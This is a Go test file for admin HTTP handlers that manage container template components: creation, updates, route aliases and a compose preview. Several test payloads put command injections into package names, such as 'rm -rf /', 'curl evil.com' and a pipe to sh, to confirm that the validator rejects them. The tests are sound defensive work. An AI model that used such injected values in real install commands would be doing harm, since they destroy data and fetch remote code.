package httpdelivery

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"solv-backend/internal/core/domain"
	"solv-backend/internal/core/services"
)

type stubComponentGovRepo struct {
	mockCacheGovRepo
	components map[string]*domain.TemplateComponent
}

func newStubComponentGovRepo() *stubComponentGovRepo {
	r := &stubComponentGovRepo{
		components: make(map[string]*domain.TemplateComponent),
	}
	py := &domain.TemplateComponent{
		ID:                 "rt-python",
		Slug:               "python-312",
		Layer:              domain.ComponentLayerRuntime,
		SubCategory:        "backend",
		Name:               "Python 3.12",
		IconKey:            "python",
		BaseImage:          "python:3.12-slim-bookworm",
		CompatibleRuntimes: []string{"python"},
		ToolsProvided:      []string{"python3", "pip"},
		RamDeltaMB:         512,
		IsSystem:           true,
		IsActive:           true,
	}
	r.components[py.ID] = py
	r.components[py.Slug] = py
	return r
}

func (s *stubComponentGovRepo) ListTemplateComponents(ctx context.Context, tenantID, layer string, includeInactive bool) ([]*domain.TemplateComponent, error) {
	seen := make(map[string]bool)
	var list []*domain.TemplateComponent
	for _, it := range s.components {
		if seen[it.ID] {
			continue
		}
		seen[it.ID] = true
		if layer != "" && string(it.Layer) != layer {
			continue
		}
		list = append(list, it)
	}
	return list, nil
}

func (s *stubComponentGovRepo) GetTemplateComponentByIDOrSlug(ctx context.Context, tenantID, idOrSlug string) (*domain.TemplateComponent, error) {
	if it, ok := s.components[idOrSlug]; ok {
		return it, nil
	}
	return nil, domain.ErrComponentNotFound
}

func (s *stubComponentGovRepo) CreateTemplateComponent(ctx context.Context, tenantID string, comp *domain.TemplateComponent) (*domain.TemplateComponent, error) {
	cp := *comp
	cp.ID = "comp-new-1"
	if cp.Slug == "" {
		cp.Slug = "comp-new-1"
	}
	cp.IsActive = true
	s.components[cp.ID] = &cp
	s.components[cp.Slug] = &cp
	return &cp, nil
}

func (s *stubComponentGovRepo) UpdateTemplateComponent(ctx context.Context, tenantID, id string, dto domain.UpdateTemplateComponentDTO, synthesizedLayer string) (*domain.TemplateComponent, error) {
	it, ok := s.components[id]
	if !ok {
		return nil, domain.ErrComponentNotFound
	}
	it.Name = dto.Name
	if dto.Description != "" {
		it.Description = dto.Description
	}
	if dto.SubCategory != "" {
		it.SubCategory = dto.SubCategory
	}
	if synthesizedLayer != "" {
		it.BuildLayerSnippet = synthesizedLayer
	} else if strings.TrimSpace(dto.InstallMode) == string(domain.InstallModeNone) && strings.TrimSpace(dto.BuildLayerSnippet) == "" {
		it.BuildLayerSnippet = ""
	}
	return it, nil
}

func (s *stubComponentGovRepo) DeleteTemplateComponent(ctx context.Context, tenantID, id string) error {
	it, ok := s.components[id]
	if !ok {
		return domain.ErrComponentNotFound
	}
	if it.IsSystem {
		return domain.ErrComponentSystemLocked
	}
	delete(s.components, id)
	return nil
}

func (s *stubComponentGovRepo) UpdateOfficialTemplate(ctx context.Context, tenantID, templateID, adminID string, dto domain.UpdateOfficialTemplateDTO) (*domain.AdminTemplateReviewItem, error) {
	return &domain.AdminTemplateReviewItem{
		ID:          templateID,
		Name:        dto.Name,
		DockerImage: dto.DockerImage,
		BaseRamMB:   dto.BaseRamMB,
	}, nil
}

func TestAdminAcademicHandler_ComponentsAndComposePreview(t *testing.T) {
	repo := newStubComponentGovRepo()
	govSvc := services.NewAdminGovernanceService(nil, repo)
	handler := NewAdminAcademicHandler(nil, nil, govSvc)

	// 1. POST componente inválido (intento de inyección en nombre de paquete) -> 422
	badBody := `{"name":"Malicious","layer":"addon","install_mode":"pip","package_names":["flask; rm -rf /"]}`
	reqBad := httptest.NewRequest(http.MethodPost, "/api/v1/admin/template-components", bytes.NewBufferString(badBody))
	recBad := httptest.NewRecorder()
	handler.CreateTemplateComponent(recBad, reqBad)
	if recBad.Code != http.StatusUnprocessableEntity {
		t.Fatalf("expected 422 on invalid package name, got %d: %s", recBad.Code, recBad.Body.String())
	}

	// 2. POST componente asistido válido -> 201
	goodBody := `{"name":"FastAPI","layer":"addon","install_mode":"pip","package_names":["fastapi","uvicorn"],"tools_provided":["python3"],"ram_delta_mb":64}`
	reqGood := httptest.NewRequest(http.MethodPost, "/api/v1/admin/template-components", bytes.NewBufferString(goodBody))
	recGood := httptest.NewRecorder()
	handler.CreateTemplateComponent(recGood, reqGood)
	if recGood.Code != http.StatusCreated {
		t.Fatalf("expected 201 on valid component, got %d: %s", recGood.Code, recGood.Body.String())
	}

	// 3. POST compose-preview -> 200 con plan compilado
	composeBody := `{"target_environment":"IDE_PERSISTENTE","stack_config":{"mode":"visual","runtime_id":"rt-python","addon_ids":["comp-new-1"],"workspace_folders":["backend"]}}`
	reqCompose := httptest.NewRequest(http.MethodPost, "/api/v1/admin/templates/compose-preview", bytes.NewBufferString(composeBody))
	recCompose := httptest.NewRecorder()
	handler.ComposeTemplatePreview(recCompose, reqCompose)
	if recCompose.Code != http.StatusOK {
		t.Fatalf("expected 200 on compose-preview, got %d: %s", recCompose.Code, recCompose.Body.String())
	}

	var resp struct {
		Data domain.ComposedTemplatePlan `json:"data"`
	}
	if err := json.Unmarshal(recCompose.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to unmarshal compose response: %v", err)
	}
	if !resp.Data.NeedsLocalBuild {
		t.Fatalf("expected NeedsLocalBuild=true when addon has pip build layer")
	}
}

func TestAdminAcademicHandler_UpdateTemplateComponentAndAliases(t *testing.T) {
	repo := newStubComponentGovRepo()
	govSvc := services.NewAdminGovernanceService(nil, repo)
	handler := NewAdminAcademicHandler(nil, nil, govSvc)

	deps := &Handlers{
		AdminAcademicHandler: handler,
		TenantMiddleware:     func(next http.Handler) http.Handler { return next },
		AuditMiddleware:      func(next http.Handler) http.Handler { return next },
	}
	mux := http.NewServeMux()
	registerAdminRoutes(mux, deps)

	// 1. Direct handler: Missing ID -> 400
	reqNoID := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/", bytes.NewBufferString(`{"name":"NoID"}`))
	recNoID := httptest.NewRecorder()
	handler.UpdateTemplateComponent(recNoID, reqNoID)
	if recNoID.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 on missing path id, got %d", recNoID.Code)
	}

	// 2. Direct handler: Component Not Found -> 404
	reqNotFound := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/non-existent", bytes.NewBufferString(`{"name":"Ghost"}`))
	reqNotFound.SetPathValue("id", "non-existent")
	recNotFound := httptest.NewRecorder()
	handler.UpdateTemplateComponent(recNotFound, reqNotFound)
	if recNotFound.Code != http.StatusNotFound {
		t.Fatalf("expected 404 on non-existent component, got %d", recNotFound.Code)
	}

	// 3. Direct handler: Invalid Package Name -> 422
	badPkgBody := `{"name":"Python 3.12","install_mode":"pip","package_names":["pip; evil"]}`
	reqBadPkg := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(badPkgBody))
	reqBadPkg.SetPathValue("id", "rt-python")
	recBadPkg := httptest.NewRecorder()
	handler.UpdateTemplateComponent(recBadPkg, reqBadPkg)
	if recBadPkg.Code != http.StatusUnprocessableEntity {
		t.Fatalf("expected 422 on invalid package name in update, got %d", recBadPkg.Code)
	}

	// 4. Test all route aliases through the mux (PUT and PATCH on template-components, tech-components, components)
	routesToTest := []struct {
		method string
		path   string
	}{
		{http.MethodPut, "/api/v1/admin/template-components/rt-python"},
		{http.MethodPatch, "/api/v1/admin/template-components/rt-python"},
		{http.MethodPut, "/api/v1/admin/tech-components/rt-python"},
		{http.MethodPatch, "/api/v1/admin/tech-components/rt-python"},
		{http.MethodPut, "/api/v1/admin/components/rt-python"},
		{http.MethodPatch, "/api/v1/admin/components/rt-python"},
	}

	for _, rt := range routesToTest {
		body := `{"name":"Python 3.12 Updated","sub_category":"backend","install_mode":"none"}`
		req := httptest.NewRequest(rt.method, rt.path, bytes.NewBufferString(body))
		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("expected 200 on %s %s, got %d: %s", rt.method, rt.path, rec.Code, rec.Body.String())
		}
		var resp struct {
			Data domain.TemplateComponent `json:"data"`
		}
		if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
			t.Fatalf("failed to decode response for %s %s: %v", rt.method, rt.path, err)
		}
		if resp.Data.Name != "Python 3.12 Updated" || resp.Data.SubCategory != "backend" {
			t.Fatalf("expected updated fields for %s %s, got: %+v", rt.method, rt.path, resp.Data)
		}
	}
}

func TestAdminAcademicHandler_UpdateTemplateComponent_EdgeCases(t *testing.T) {
	repo := newStubComponentGovRepo()
	govSvc := services.NewAdminGovernanceService(nil, repo)
	handler := NewAdminAcademicHandler(nil, nil, govSvc)

	// 1. Malformed JSON returns 400 Bad Request
	reqMalformed := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(`{"name": `))
	reqMalformed.SetPathValue("id", "rt-python")
	recMalformed := httptest.NewRecorder()
	handler.UpdateTemplateComponent(recMalformed, reqMalformed)
	if recMalformed.Code != http.StatusBadRequest {
		t.Errorf("expected 400 on malformed JSON, got %d", recMalformed.Code)
	}

	// 2. Subcategory switch from backend to web
	reqSubCat := httptest.NewRequest(http.MethodPatch, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(`{"name":"Python 3.12","sub_category":"web"}`))
	reqSubCat.SetPathValue("id", "rt-python")
	recSubCat := httptest.NewRecorder()
	handler.UpdateTemplateComponent(recSubCat, reqSubCat)
	if recSubCat.Code != http.StatusOK {
		t.Errorf("expected 200 on subcategory update, got %d: %s", recSubCat.Code, recSubCat.Body.String())
	}
	var respSubCat struct {
		Data domain.TemplateComponent `json:"data"`
	}
	_ = json.Unmarshal(recSubCat.Body.Bytes(), &respSubCat)
	if respSubCat.Data.SubCategory != "web" {
		t.Errorf("expected sub_category='web', got %q", respSubCat.Data.SubCategory)
	}

	// 3. Command injection in package names returns 422
	injectionCases := []string{
		`{"name":"Python","install_mode":"pip","package_names":["fastapi; rm -rf /"]}`,
		`{"name":"Python","install_mode":"pip","package_names":["numpy && curl evil.com"]}`,
		`{"name":"Node","install_mode":"npm","package_names":["@angular/cli | sh"]}`,
	}
	for idx, badPayload := range injectionCases {
		reqInj := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(badPayload))
		reqInj.SetPathValue("id", "rt-python")
		recInj := httptest.NewRecorder()
		handler.UpdateTemplateComponent(recInj, reqInj)
		if recInj.Code != http.StatusUnprocessableEntity {
			t.Errorf("case %d: expected 422 on malicious package name, got %d", idx, recInj.Code)
		}
	}

	// 4. Short name (< 2 characters) returns 422
	reqShort := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(`{"name":"A"}`))
	reqShort.SetPathValue("id", "rt-python")
	recShort := httptest.NewRecorder()
	handler.UpdateTemplateComponent(recShort, reqShort)
	if recShort.Code != http.StatusUnprocessableEntity {
		t.Errorf("expected 422 on name with < 2 characters, got %d", recShort.Code)
	}

	// 5. Image ending with :latest returns 422
	reqLatest := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(`{"name":"Python 3.12","base_image":"python:latest"}`))
	reqLatest.SetPathValue("id", "rt-python")
	recLatest := httptest.NewRecorder()
	handler.UpdateTemplateComponent(recLatest, reqLatest)
	if recLatest.Code != http.StatusUnprocessableEntity {
		t.Errorf("expected 422 on image with :latest tag, got %d", recLatest.Code)
	}
}
